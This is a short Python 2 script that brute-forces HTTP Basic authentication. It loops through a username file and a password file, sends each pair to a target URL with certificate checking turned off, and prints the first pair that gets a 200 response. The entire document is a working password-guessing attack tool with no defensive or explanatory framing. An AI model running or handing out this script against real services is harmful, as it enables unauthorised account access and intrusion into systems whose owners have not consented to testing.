import requests
import sys

if len(sys.argv) != 4:
    print 'USAGE: brute_http_basic.py url userfile passfile'
    sys.exit()

url = sys.argv[1]
userfile = sys.argv[2]
passfile = sys.argv[3]

for pwd in open(passfile):
    for user in open(userfile):
        user = user.rstrip('\r\n')
        pwd = pwd.rstrip('\r\n')
        resp = requests.get(url, auth=requests.auth.HTTPBasicAuth(user, pwd),
                            verify=False)
        if resp.status_code == 200:
            print 'Success: {0}/{1}'.format(user, pwd)
            sys.exit()
        else:
            print 'Failure: {0}/{1}'.format(user, pwd)
